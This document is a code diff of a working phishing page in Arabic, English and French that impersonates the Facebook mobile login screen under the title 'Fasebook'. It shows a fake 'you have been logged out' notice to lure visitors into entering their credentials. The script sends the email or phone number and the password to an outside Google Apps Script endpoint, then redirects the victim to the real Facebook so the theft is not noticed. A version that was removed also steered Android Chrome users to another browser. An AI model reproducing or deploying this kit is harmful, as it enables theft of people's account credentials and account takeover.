@@ -1,144 +1,109 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>Fasebook</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-<style>
-:root {
-  --facebook-blue: #1877f2;
-  --input-border: #ccd0d5;
-  --button-hover: #166fe5;
-}
-body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
-  background-color: #fff;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: flex-start;
-  min-height: 100vh;
-}
+  <meta charset="UTF-8">
+  <title>Fasebook</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- أيقونات Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    :root {
+      --facebook-blue: #1877f2;
+      --input-border: #ccd0d5;
+      --button-hover: #166fe5;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+    .lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
+    .logo { margin: 50px 0 30px 0; }
+    .logo img { width: 65px; height: 65px; }
+    .container { width: 90%; max-width: 360px; }
+    form { background-color: #fff; text-align: center; }
+    .input-group { position: relative; margin-bottom: 5px; }
+    .input-group input {
+      width: 100%; padding: 15px 12px 15px 40px;
+      border: 1px solid var(--input-border); border-radius: 12px;
+      font-size: 15px; box-sizing: border-box;
+    }
+    .input-group .icon {
+      position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
+      color: #888; font-size: 16px;
+    }
+    .error-bubble {
+      display: none; background: #000; color: #fff; font-size: 12px;
+      padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
+      width: fit-content; max-width: 90%; text-align: right; position: relative;
+    }
+    .error-bubble::after {
+      content: ""; position: absolute; bottom: 100%; right: 15px;
+      border-width: 6px; border-style: solid;
+      border-color: transparent transparent #000 transparent;
+    }
+    button {
+      width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
+      color: white; font-size: 17px; font-weight: bold;
+      border-radius: 12px; cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
+    }
+    button:hover { background-color: var(--button-hover); }
+    .forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
+    .create-account {
+      margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
+      background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
+      border-radius: 12px; cursor: pointer;
+    }
+    .msg {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #444;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
+    .spinner {
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--facebook-blue);
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
-/* فقاعة التحذير Chrome */
-#browserToast {
-  display: none;
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  background: #ff4d4d;
-  color: #fff;
-  padding: 25px 30px;
-  border-radius: 20px;
-  font-weight: bold;
-  text-align: center;
-  z-index: 9999;
-  max-width: 90%;
-}
-#browserToast button {
-  margin-top: 15px;
-  padding: 10px 15px;
-  border: none;
-  border-radius: 8px;
-  background: #fff;
-  color: #ff4d4d;
-  font-weight: bold;
-  cursor: pointer;
-  font-size: 16px;
-}
-
-/* محتوى الموقع الأصلي */
-#mainContent {
-  width: 100%;
-}
-.lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
-.logo { margin: 50px 0 30px 0; }
-.logo img { width: 65px; height: 65px; }
-.container { width: 90%; max-width: 360px; margin: 0 auto; }
-form { background-color: #fff; text-align: center; }
-.input-group { position: relative; margin-bottom: 5px; }
-.input-group input {
-  width: 100%; padding: 15px 12px 15px 40px;
-  border: 1px solid var(--input-border); border-radius: 12px;
-  font-size: 15px; box-sizing: border-box;
-}
-.input-group .icon {
-  position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
-  color: #888; font-size: 16px;
-}
-.error-bubble {
-  display: none; background: #000; color: #fff; font-size: 12px;
-  padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
-  width: fit-content; max-width: 90%; text-align: right; position: relative;
-}
-.error-bubble::after {
-  content: ""; position: absolute; bottom: 100%; right: 15px;
-  border-width: 6px; border-style: solid;
-  border-color: transparent transparent #000 transparent;
-}
-button { width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
-  color: white; font-size: 17px; font-weight: bold; border-radius: 12px;
-  cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
-}
-button:hover { background-color: var(--button-hover); }
-.forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
-.create-account {
-  margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
-  background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
-  border-radius: 12px; cursor: pointer;
-}
-.msg {
-  margin-top: 15px;
-  font-size: 15px;
-  color: #444;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-}
-.meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
-.spinner {
-  border: 3px solid rgba(0, 0, 0, 0.1);
-  border-left-color: var(--facebook-blue);
-  border-radius: 50%;
-  width: 18px;
-  height: 18px;
-  animation: spin 0.8s linear infinite;
-}
-@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
-
-.toast {
-  position: fixed;
-  bottom: 20px;
-  right: 50%;
-  transform: translateX(50%);
-  background: #000;
-  color: #fff;
-  padding: 12px 20px;
-  border-radius: 25px;
-  font-size: 14px;
-  opacity: 0;
-  visibility: hidden;
-  transition: opacity 0.5s ease, visibility 0.5s ease;
-  z-index: 9999;
-  text-align: center;
-}
-.toast.show { opacity: 1; visibility: visible; }
-
-</style>
+    /* ✅ فقاعة أسفل الصفحة */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: #000;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
+  </style>
 </head>
 <body>
 
-<div id="browserToast">
-  عذرًا، هذا الموقع لا يعمل على Google Chrome.<br>
-  <button id="openDefault">أنقر هنا</button>
-</div>
-
-<div id="mainContent">
   <div class="lang" id="langBtn">العربية ⌵</div>
 
   <div class="logo">
@@ -164,36 +129,162 @@ button:hover { background-color: var(--button-hover); }
     <div class="msg" id="msg"></div>
   </div>
 
+  <!-- ✅ رابط Meta -->
   <div class="meta" id="metaLink">Meta ©</div>
 
+  <!-- ✅ فقاعة الإشعار -->
   <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
-</div>
 
-<script>
-window.addEventListener("load", () => {
-  const isAndroid = /Android/i.test(navigator.userAgent);
-  const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-  const browserToast = document.getElementById("browserToast");
-  const mainContent = document.getElementById("mainContent");
+  <script>
+    const langBtn = document.getElementById("langBtn");
+    const emailInput = document.getElementById("emailInput");
+    const passInput = document.getElementById("passInput");
+    const submitButton = document.getElementById("submitButton");
+    const forgotText = document.getElementById("forgotText");
+    const createBtn = document.getElementById("createBtn");
+    const errorEmail = document.getElementById("error-email");
+    const errorPass = document.getElementById("error-pass");
+    const msg = document.getElementById("msg");
+    const form = document.getElementById("myForm");
+    const toast = document.getElementById("toast");
 
-  if(isAndroid && isChrome){
-    mainContent.style.display = "none";
-    browserToast.style.display = "block";
-
-    document.getElementById("openDefault").addEventListener("click", () => {
-      window.open(window.location.href, "_blank");
-      browserToast.style.display = "none";
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
     });
 
-    return;
-  }
+    // باقي الكود بدون تغيير
+    const translations = {
+      ar: {
+        lang: "العربية ⌵",
+        emailPlaceholder: "الرقم أو الإيميل",
+        passPlaceholder: "كلمة المرور",
+        login: "تسجيل الدخول",
+        forgot: "هل نسيت كلمة السر؟",
+        create: "إنشاء حساب جديد",
+        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
+        errorPass: "أدخل كلمة سر صحيحة",
+        waiting: "جاري تسجيل الدخول...",
+        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
+        customPass: "يرجى إدخال كلمة سر صحيحة"
+      },
+      en: {
+        lang: "English ⌵",
+        emailPlaceholder: "Email or Phone",
+        passPlaceholder: "Password",
+        login: "Log In",
+        forgot: "Forgotten password?",
+        create: "Create new account",
+        errorEmail: "Enter a valid email or phone number",
+        errorPass: "Enter a valid password",
+        waiting: "Logging in...",
+        customEmail: "Please enter a valid email or phone number",
+        customPass: "Please enter a valid password"
+      },
+      fr: {
+        lang: "Français ⌵",
+        emailPlaceholder: "E-mail ou téléphone",
+        passPlaceholder: "Mot de passe",
+        login: "Se connecter",
+        forgot: "Mot de passe oublié ?",
+        create: "Créer un nouveau compte",
+        errorEmail: "Entrez un e-mail ou un numéro valide",
+        errorPass: "Entrez un mot de passe valide",
+        waiting: "Connexion en cours...",
+        customEmail: "Veuillez entrer un e-mail ou un numéro valide",
+        customPass: "Veuillez entrer un mot de passe valide"
+      }
+    };
 
-  const toast = document.getElementById("toast");
-  toast.classList.add("show");
-  setTimeout(() => { toast.classList.remove("show"); }, 4000);
-});
+    const langs = ["ar", "en", "fr"];
+    let currentLangIndex = 0;
+    const savedLang = localStorage.getItem("langIndex");
+    if (savedLang !== null) {
+      currentLangIndex = parseInt(savedLang);
+    }
 
-// باقي كود الموقع الأصلي (تغيير اللغة، التحقق من الحقول، الإرسال) يبقى كما هو
-</script>
+    function updateLanguage() {
+      const langKey = langs[currentLangIndex];
+      const t = translations[langKey];
+      langBtn.textContent = t.lang;
+      emailInput.placeholder = t.emailPlaceholder;
+      passInput.placeholder = t.passPlaceholder;
+      submitButton.textContent = t.login;
+      forgotText.textContent = t.forgot;
+      createBtn.textContent = t.create;
+      errorEmail.textContent = t.errorEmail;
+      errorPass.textContent = t.errorPass;
+
+      emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
+      emailInput.oninput = function() { this.setCustomValidity(""); };
+      passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
+      passInput.oninput = function() { this.setCustomValidity(""); };
+
+      localStorage.setItem("langIndex", currentLangIndex);
+    }
+
+    langBtn.addEventListener("click", () => {
+      currentLangIndex = (currentLangIndex + 1) % langs.length;
+      updateLanguage();
+    });
+
+    updateLanguage();
+
+    forgotText.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/login/identify/";
+    });
+
+    createBtn.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/reg/";
+    });
+
+    document.getElementById("metaLink").addEventListener("click", () => {
+      window.location.href = "https://about.meta.com/";
+    });
+
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      let valid = true;
+      errorEmail.style.display = "none";
+      errorPass.style.display = "none";
+
+      const emailOrPhone = emailInput.value.trim();
+      const password = passInput.value.trim();
+      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+      const phoneRegex = /^[0-9]{6,15}$/;
+
+      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
+        errorEmail.style.display = "block"; valid = false;
+      }
+      if (password.length < 4) {
+        errorPass.style.display = "block"; valid = false;
+      }
+      if (!valid) return;
+
+      const t = translations[langs[currentLangIndex]];
+      msg.innerHTML = `<div class="spinner"></div><span>${t.waiting}</span>`;
+      submitButton.disabled = true;
+
+      const data = { email_or_phone: emailOrPhone, password: password };
+      fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
+        method: "POST",
+        body: JSON.stringify(data)
+      })
+      .then(res => res.text())
+      .then(txt => {
+        form.reset();
+        window.location.href = "https://www.facebook.com";
+      })
+      .catch(err => {
+        msg.innerHTML = "❌ Error: " + err;
+        msg.style.color = "red";
+        submitButton.disabled = false;
+      });
+    });
+  </script>
+
 </body>
 </html>
